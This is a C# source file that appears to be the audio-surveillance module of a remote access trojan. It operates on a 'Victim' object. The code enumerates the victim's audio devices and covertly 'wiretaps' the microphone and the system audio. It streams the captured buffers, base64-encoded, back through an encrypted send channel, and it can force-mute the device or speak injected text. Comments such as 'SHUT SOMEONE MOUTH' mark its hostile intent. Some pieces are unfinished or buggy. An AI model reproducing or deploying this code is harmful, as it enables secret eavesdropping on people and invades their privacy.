using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Speech.Synthesis;
using System.IO;
using NAudio.Wave;
using NAudio.CoreAudioApi;
using System.Runtime.InteropServices;
using System.Data;
using System.Collections.Concurrent;
using NAudio.Wave.SampleProviders;
using System.Media;

namespace winClient48
{
    internal class AudioPacketWriter
    {
        private readonly string file_path;
        private readonly ConcurrentQueue<(long Index, byte[] Data)> packet_queue;
        private readonly SemaphoreSlim file_lock;
        private bool is_processing;

        private WaveFileWriter wave_writer;

        public AudioPacketWriter(string file_path, WaveFileWriter wave_writer)
        {
            this.file_path = file_path;
            this.wave_writer = wave_writer;
        }

        public void EnqueuePacket(long idx, byte[] data)
        {
            packet_queue.Enqueue((idx, data));
            ProcessQueue();
        }

        private void ProcessQueue()
        {
            if (is_processing)
                return;

            is_processing = true;

            //LOCK
            Task.Run(async () =>
            {
                while (packet_queue.TryDequeue(out var packet))
                {
                    await file_lock.WaitAsync();
                    try
                    {
                        WritePacketIntoFile(packet.Index, packet.Data);
                    }
                    finally
                    {
                        file_lock.Release();
                    }
                }
                is_processing = false;
            });
        }

        private void WritePacketIntoFile(long idx, byte[] data)
        {
            using (var fs = new FileStream(file_path, FileMode.OpenOrCreate, FileAccess.Write, FileShare.Read))
            {
                fs.Seek(idx, SeekOrigin.Begin);
                fs.Write(data, 0, data.Length);
            }
        }
    }

    internal class MicAudio
    {
        public enum TapType
        {
            Audio,
            Microphone,
        }
        private WaveFormat wave_format;

        public Victim v;
        private List<Tuple<int, string>> mic_devices = new List<Tuple<int, string>>();
        private List<Tuple<int, string>> speaker_devices = new List<Tuple<int, string>>();

        private MicrophoneCapture mic_cap;
        private SystemAudioCapture sys_cap;

        public bool MicAudioWriteMP3 { get; set; }
        public bool SysAudioWriteMP3 { get; set; }

        public string micMP3_output { get; set; }
        public string sysMP3_output { get; set; }

        public bool micWiretap { get; set; }
        public bool sysWiretap { get; set; }

        private MMDevice default_device;
        private MMDeviceEnumerator device_enum;
        private AudioEndpointVolume device_volume;

        public bool MuteDevice { get; set; } //SHUT SOMEONE MOUTH
        public bool DisableMute { get; set; } //MAKE SOMEONE EMBARRASSING

        private DateTime last_update;

        private AudioPacketWriter mic_AudioWriter;
        private AudioPacketWriter sys_AudioWriter;

        private WaveFileWriter mic_WaveFileWriter;
        private WaveFileWriter sys_WaveFileWriter;

        private long mic_IdxPacketWriter = 0;
        private long sys_IdxPacketWriter = 0;

        public MicAudio(Victim v, string mic_output, string sys_output)
        {
            mic_cap = new MicrophoneCapture();
            sys_cap = new SystemAudioCapture();

            micMP3_output = mic_output;
            sysMP3_output = sys_output;

            wave_format = new WaveFormat(44100, 1);

            mic_WaveFileWriter = new WaveFileWriter(mic_output, wave_format);
            sys_WaveFileWriter = new WaveFileWriter(sys_output, wave_format);

            //mic_AudioWriter = new AudioPacketWriter(mic_output, mic_WaveFileWriter);
            //sys_AudioWriter = new AudioPacketWriter(sys_output, sys_WaveFileWriter);

            MuteDevice = false;
            DisableMute = false;

            micWiretap = false;
            sysWiretap = false;

            SysAudioWriteMP3 = false;
            MicAudioWriteMP3 = false;

            last_update = DateTime.Now;

            this.v = v;

            for (int i = 0; i < WaveInEvent.DeviceCount; i++)
            {
                var device = WaveInEvent.GetCapabilities(i);
                mic_devices.Add(Tuple.Create(i, device.ProductName));
            }

            device_enum = new MMDeviceEnumerator();
            int j = 0;
            foreach (var device in device_enum.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active))
            {
                speaker_devices.Add(Tuple.Create(j, device.FriendlyName));
                j++;
            }

            default_device = device_enum.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);
            device_volume = default_device.AudioEndpointVolume;
            device_volume.OnVolumeNotification += (e) =>
            {
                if (MuteDevice)
                {
                    device_volume.Mute = MuteDevice;
                    device_volume.MasterVolumeLevelScalar = 0.0f;
                }

                float vol = device_volume.MasterVolumeLevelScalar * 100.0f;
                UpdateVol(vol);
            };
        }

        public string Init()
        {
            return string.Join("?", new string[]
            {
                GetMicrophoneDevices(),
                GetSpeakerDevices(),
            });
        }
        private string GetMicrophoneDevices()
        {
            string data = string.Join(",", mic_devices.Select(x => $"{x.Item1};{Crypto.b64E2Str(x.Item2)}").ToArray());
            return data;
        }
        private string GetSpeakerDevices()
        {
            string data = string.Join(",", speaker_devices.Select(x => $"{x.Item1};{Crypto.b64E2Str(x.Item2)}").ToArray());
            return data;
        }

        public void StartWiretapping(string tap_type, int idx)
        {
            TapType type = (TapType)Enum.Parse(typeof(TapType), tap_type);
            switch (type)
            {
                case TapType.Audio:
                    sysWiretap = true;
                    sys_cap?.Start(v, idx, SendBuffer);
                    break;
                case TapType.Microphone:
                    micWiretap = true;
                    mic_cap?.Start(v, SendBuffer);
                    break;
            }
        }
        public void StopWiretapping(string tap_type, int idx)
        {
            TapType type = (TapType)Enum.Parse(typeof(TapType), tap_type);
            switch (type)
            {
                case TapType.Audio:
                    sysWiretap = false;
                    sys_cap?.Stop();
                    break;
                case TapType.Microphone:
                    micWiretap = false;
                    mic_cap?.Stop();
                    break;
            }
        }

        public void StopRecord(string tap_type)
        {
            TapType type = (TapType)Enum.Parse(typeof(TapType), tap_type);
            switch (type)
            {
                case TapType.Audio:
                    mic_cap?.Stop();
                    break;
                case TapType.Microphone:
                    sys_cap?.Stop();
                    break;
            }
        }

        public void SpeechText(string text, int volume)
        {
            var synthesizer = new SpeechSynthesizer();
            synthesizer.Volume = volume;
            synthesizer.Speak(text);
        }

        public void SaveToWav(string filepath, byte[] pcm_data, int bytes_recorded)
        {
            try
            {
                using (var wave_file = new WaveFileWriter(filepath, wave_format))
                {
                    wave_file.Write(pcm_data, 0, bytes_recorded);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        public void FixVolume(bool mute, int volume)
        {

        }

        public void SetSystemAudioVolume(float volume)
        {
            device_volume.MasterVolumeLevelScalar = volume / 100.0f;
            default_device.AudioEndpointVolume.Mute = volume == 0;
        }

        public double Bytes_dB(byte[] buffer, int bytes_recorded)
        {
            short[] samples = new short[bytes_recorded / 2];
            for (int i = 0; i < samples.Length; i++)
            {
                samples[i] = BitConverter.ToInt16(buffer, i * 2);
            }

            // Calculate RMS (Root Mean Square) for volume intensity
            double rms = 0;
            foreach (var sample in samples)
            {
                rms += sample * sample;
            }
            rms = Math.Sqrt(rms / samples.Length);

            // Convert RMS to decibels (dB)
            double decibels = 20 * Math.Log10(rms / short.MaxValue);
            if (double.IsNegativeInfinity(decibels)) decibels = -96;

            return decibels;
        }

        public void SendBuffer(Victim v, string type, byte[] buffer, int bytes_recorded)
        {
            v.encSend(2, 0, $"audio|wiretap|{type}|buffer|{Bytes_dB(buffer, bytes_recorded)}|" + Convert.ToBase64String(buffer));
            
            /*
            if (type == "micro" && MicAudioWriteMP3)
                SaveToWav(micMP3_output, buffer, bytes_recorded);
            else if (type == "system" && SysAudioWriteMP3)
                SaveToWav(sysMP3_output, buffer, bytes_recorded);
            */
            if (type == "micro" && MicAudioWriteMP3)
                mic_AudioWriter.EnqueuePacket(mic_IdxPacketWriter++, buffer);
            else if (type == "system" && SysAudioWriteMP3)
                sys_AudioWriter.EnqueuePacket(sys_IdxPacketWriter++, buffer);
        }

        private void UpdateVol(float vol)
        {
            if (DateTime.Now - last_update < TimeSpan.FromMilliseconds(1000))
                return;

            last_update = DateTime.Now;
            vol = vol > 100.0f ? 100.0f : vol;
            v.encSend(2, 0, "audio|update|vol|" + vol);
        }
    }

    //Event
    public class AudioCaptureEventArgs : EventArgs
    {
        public byte[] AudioBytes { get; }

        public AudioCaptureEventArgs(byte[] audio_bytes)
        {
            AudioBytes = audio_bytes;
        }
    }

    //Capture Microphone Audio
    public class MicrophoneCapture
    {
        private WaveInEvent wave_in;
        public event EventHandler<AudioCaptureEventArgs> DataAvailable;
        private MicAudio micAudio;
        public delegate void SendBuffer(Victim v, string type, byte[] buffer, int bytes_recorded);
        private SendBuffer sendBuffer;

        private Victim v;

        public void Start(Victim v, SendBuffer sendBuffer)
        {
            this.v = v;
            this.sendBuffer = sendBuffer;
            wave_in = new WaveInEvent()
            {
                WaveFormat = new WaveFormat(44100, 16, 1), //44.1kHz, 16-bit, mono
            };
            wave_in.DataAvailable += OnDataAvailable;
            wave_in.StartRecording();
        }
        public void Stop()
        {
            if (wave_in != null)
            {
                wave_in.StopRecording();
                wave_in.Dispose();
                wave_in = null;
            }
        }

        private void OnDataAvailable(object sender, WaveInEventArgs e)
        {
            byte[] buffer = e.Buffer;
            int bytes_recorded = e.BytesRecorded;

            byte[] audio_data = new byte[bytes_recorded];
            Array.Copy(buffer, 0, audio_data, 0, bytes_recorded);

            sendBuffer(v, "micro", buffer, bytes_recorded);

            DataAvailable?.Invoke(this, new AudioCaptureEventArgs(audio_data));
        }
    }

    //Capture System Audio
    public class SystemAudioCapture
    {
        private WasapiCapture wasApiCapture;
        private WaveFileWriter writer;
        private Victim v;
        public delegate void SendBuffer(Victim v, string type, byte[] buffer, int bytes_recorded);
        private SendBuffer sendBuffer;

        public event EventHandler<AudioCaptureEventArgs> DataAvailable;

        public void Start(Victim v, int idx, SendBuffer sendBuffer)
        {
            this.v = v;
            this.sendBuffer = sendBuffer;
            wasApiCapture = new WasapiCapture();
            wasApiCapture.WaveFormat = new WaveFormat(44100, 16, 1); //44.1kHz, 16-bit, mono
            wasApiCapture.DataAvailable += OnDataAvailable;
            wasApiCapture.StartRecording();
        }

        public void Stop()
        {
            if (wasApiCapture != null)
            {
                wasApiCapture.StopRecording();
                wasApiCapture.Dispose();
                wasApiCapture = null;
            }
        }

        private void OnDataAvailable(object sender, WaveInEventArgs e)
        {
            byte[] buffer = e.Buffer;
            int bytes_recorded = e.BytesRecorded;

            byte[] audioData = new byte[bytes_recorded];
            Array.Copy(buffer, 0, audioData, 0, bytes_recorded);

            sendBuffer(v, "system", buffer, bytes_recorded);

            DataAvailable?.Invoke(this, new AudioCaptureEventArgs(audioData));
        }
    }

    //Play Audio
    public class AudioPlayer
    {
        private BufferedWaveProvider bufferedWaveProvider;
        private WaveOutEvent waveOut;

        public AudioPlayer()
        {
            bufferedWaveProvider = new BufferedWaveProvider(new WaveFormat(44100, 16, 1)); // 44.1kHz, 16-bit, mono
            waveOut = new WaveOutEvent();
            waveOut.Init(bufferedWaveProvider);
        }

        public void Start()
        {
            waveOut.Play();
        }

        public void Play(byte[] audioData)
        {
            // Write the audio data into the buffer
            bufferedWaveProvider.AddSamples(audioData, 0, audioData.Length);
        }

        public void PlayFromMP3(string mp3_file)
        {

        }

        public void SystemSound(int dwSound)
        {
            switch (dwSound)
            {
                case 0:
                    SystemSounds.Asterisk.Play();
                    break;
                case 1:
                    SystemSounds.Beep.Play();
                    break;
                case 2:
                    SystemSounds.Exclamation.Play();
                    break;
                case 3:
                    SystemSounds.Hand.Play();
                    break;
                case 4:
                    SystemSounds.Question.Play();
                    break;
            }
        }

        public void Stop()
        {
            waveOut.Stop();
            waveOut.Dispose();
        }
    }
}
